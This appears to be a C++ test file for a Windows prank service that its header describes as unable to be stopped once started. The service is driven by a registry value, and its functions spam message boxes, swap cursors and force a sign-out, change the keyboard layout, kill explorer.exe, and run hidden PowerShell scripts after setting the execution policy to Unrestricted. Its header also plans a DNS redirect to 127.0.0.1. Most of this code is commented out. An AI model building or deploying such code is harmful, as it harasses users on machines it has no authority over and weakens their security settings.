// tester.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

// Prom Event Loader.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
// Author : Jon Bauer (@JonBauer123)
// Description : This is the a Service that cannot be stopped or paused once started. It reads a registery
//				 key and determines which function. These functions include running powershell scripts,
//				 signning the user out, or messing with the cursor.
//
// Dependences : -Knowledge of where the scripts will be before hand.
//				 -Two cursor files placed with the other ones, named what is documented above the 
//				  glitchCursor function.

/*
	Current Registry Value to Control Flow : Computer\HKEY_CURRENT_USER\AppEvents\testvalue (DWORD)

	0x0000000 : The default waiting value
	0x0000001 : Message "Welcome to Prom!!!" as title and "Are you ready for a long day?" as message 100x.
	0x0000002 : Glitch the Cursor
	0x0000003 : Return Cursor to default Cursor
	0x0000004 : Runs the RickBomb.ps1 script
	0x0000005 : Runs the script to change keyboard to dvorak
	0x0000006 : Runs the script to change keyboard to qwert
	0x0000007 : Runs the script to change Primary DNS server to 127.0.0.1 and flushes DNS cache
	0x0000008 : -
	0x0000009 : -
	0x0000010 : -

*/

#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <string>
#include <process.h>
#include <TlHelp32.h>

using namespace std;

//#define NUM_BOXES 10

typedef DWORD(WINAPI* PtrWinStationSendMessage)(HANDLE, ULONG, LPCWSTR, ULONG, LPCWSTR, ULONG, ULONG, ULONG, PULONG, BOOLEAN);

void messageSpam(LPCWSTR title, LPCWSTR text) {

	cout << "\tMade it in.\n";

	auto hModule = LoadLibrary(L"C:\\Windows\\System32\\winsta.dll");
	PtrWinStationSendMessage WinStationSendMessageW = (PtrWinStationSendMessage)GetProcAddress(hModule, "WinStationSendMessageW");

	DWORD response;

	LPCWSTR testtitle = L"Welcome to Prom!!!";
	LPCWSTR testtext = L"Are you ready? We are.";

	wstring mystr = L"";
	for (int i = 0; i < 100; i++) {
		mystr.append(L"Are you ready? ");
	}

	testtext = mystr.c_str();
	cout << "\tStarting the print.\n";

	// Displays 100 boxes on the screen
	for (int i = 0; i < 2; i++) {
		cout << "\tPrinting box : " << i << endl;
		WinStationSendMessageW(
			NULL,
			1,
			testtitle,
			wcslen(testtitle) * 4 + 1,
			testtext,
			wcslen(testtext) * 4 + 1,
			MB_YESNO | MB_ICONQUESTION,
			0,
			&response,
			TRUE
		);
		Sleep(100);
	}

	cout << "\tPrinted them all out.\n";
}
/*
void callScript(string path) {

	if (_access(path.c_str(), 0) == 0) {
		string run = "start powershell.exe -windowstyle hidden ";
		run.append(path);

		cout << "\t" << run << endl;

		system("start powershell.exe -windowstyle hidden Set-ExecutionPolicy Unrestricted -Force \n");
		Sleep(1000);
		system(run.c_str());
	}
	else {
		cout << "\tFAILED TO LOAD FILE\n";
	}
}

void glitchCursor() {

	HKEY reg = HKEY_CURRENT_USER;
	LPCWSTR regPath = L"Control Panel\\Cursors";
	HKEY hkey;

	wcout << "Attempting to open register: " << regPath << endl;

	long openCheck = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hkey);

	if (openCheck != ERROR_SUCCESS) {
		wcout << "\tERROR: Could not open register " << regPath << endl;
		return;
	}

	cout << "\tRegister openned, changing values ...\n";

	LPCWSTR valuename = L"Arrow";
	wstring path = L"%SystemRoot%\\cursors\\aero_arrow_s.cur";
	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"Hand";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"Help";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"Wait";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"AppStarting";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"No";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"NWPen";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeAll";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNESW";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNS";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNWSE";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeWE";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"UpArrow";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	RegCloseKey(hkey);

	system("shutdown -L");
}

void defaultCursor() {

	HKEY reg = HKEY_CURRENT_USER;
	LPCWSTR regPath = L"Control Panel\\Cursors";
	HKEY hkey;

	wcout << "Attempting to open register: " << regPath << endl;

	long openCheck = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hkey);

	if (openCheck != ERROR_SUCCESS) {
		wcout << "\tERROR: Could not open register " << regPath << endl;
		return;
	}

	cout << "\tRegister openned, changing values ...\n";

	LPCWSTR valuename = L"Arrow";
	wstring path = L"%SystemRoot%\\cursors\\aero_arrow.cur";
	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"Hand";
	path = L"%SystemRoot%\\cursors\\aero_link.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"Help";
	path = L"%SystemRoot%\\cursors\\aero_helpsel.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"Wait";
	path = L"%SystemRoot%\\cursors\\aero_busy.ani";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"AppStarting";
	path = L"%SystemRoot%\\cursors\\aero_working.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"No";
	path = L"%SystemRoot%\\cursors\\aero_unavail.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"NWPen";
	path = L"%SystemRoot%\\cursors\\aero_pen.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeAll";
	path = L"%SystemRoot%\\cursors\\aero_move.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNESW";
	path = L"%SystemRoot%\\cursors\\aero_nesw.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNS";
	path = L"%SystemRoot%\\cursors\\aero_ns.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNWSE";
	path = L"%SystemRoot%\\cursors\\aero_nwse.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeWE";
	path = L"%SystemRoot%\\cursors\\aero_ew.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"UpArrow";
	path = L"%SystemRoot%\\cursors\\aero_up.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	RegCloseKey(hkey);

	system("shutdown -L");
}

void changeKeyboard() {

	HKEY reg = HKEY_USERS;
	LPCWSTR regPath = L".DEFAULT\\Keyboard Layout\\Preload";
	HKEY hkey;

	wcout << "Attempting to open register: " << regPath << endl;

	long openCheck = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hkey);

	if (openCheck != ERROR_SUCCESS) {
		wcout << "\tERROR: Could not open register " << regPath << endl;
		return;
	}

	cout << "\tRegister openned, changing values ...\n";

	LPCWSTR valuename = L"1";
	wstring path = L"00010409";
	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}
}

void defaultKeyboard() {

	HKEY reg = HKEY_USERS;
	LPCWSTR regPath = L".DEFAULT\\Keyboard Layout\\Preload";
	HKEY hkey;

	wcout << "Attempting to open register: " << regPath << endl;

	long openCheck = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hkey);

	if (openCheck != ERROR_SUCCESS) {
		wcout << "\tERROR: Could not open register " << regPath << endl;
		return;
	}

	cout << "\tRegister openned, changing values ...\n";

	LPCWSTR valuename = L"1";
	wstring path = L"00000409";
	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}
}

void killExplorer() {

	cout << "\tKilling explorer.\n";

	system("taskkill /IM explorer.exe /F"); // This is sad need to find a better way

	cout << "\tExplorer killed.\n";

}
*/
int main()
{
	ShowWindow(::GetConsoleWindow(), SW_SHOW);

	printf("Beginning Testing ...\n");

	//callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\RickBomb.ps1");

	//messageSpam(L"Welcome to Prom!!!", L"Are you ready? We are.");

	//glitchCursor();
	//defaultCursor();
	//changeKeyboard();
	//defaultKeyboard();

	//killExplorer();
	
	//readValue();
/*
	HKEY hKey;
	DWORD buffer;
	LONG result;
	DWORD type = REG_DWORD, size = 1024;

	HKEY reg = HKEY_CURRENT_USER;
	LPCWSTR regPath = L"AppEvents";
	LPCWSTR regRead = L"testvalue";

	DWORD resetValue = 0x00000000;

	while (1) {
		result = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hKey);
		if (result == ERROR_SUCCESS)
		{
			result = RegQueryValueEx(hKey, regRead, NULL, 0, (LPBYTE)&buffer, &size);
			if (result == ERROR_SUCCESS) {
				if (buffer == 0x00000001) {
					cout << "spamming messages\n";
					messageSpam(L"Welcome to Prom!!!", L"Are you ready? We are.");
				}
				else if (buffer == 0x00000002) {
					cout << "fucking up the cursor\n";
					glitchCursor();
				}
				else if (buffer == 0x00000003) {
					cout << "restoring the cursor\n";
					defaultCursor();
				}
			}
			RegSetValueEx(hKey, regRead, 0, REG_DWORD, (BYTE*)&resetValue, sizeof(resetValue));
			RegCloseKey(hKey);
		}
		Sleep(1000);
	}
	*/
	printf("End Testing\n");

	return 0;
}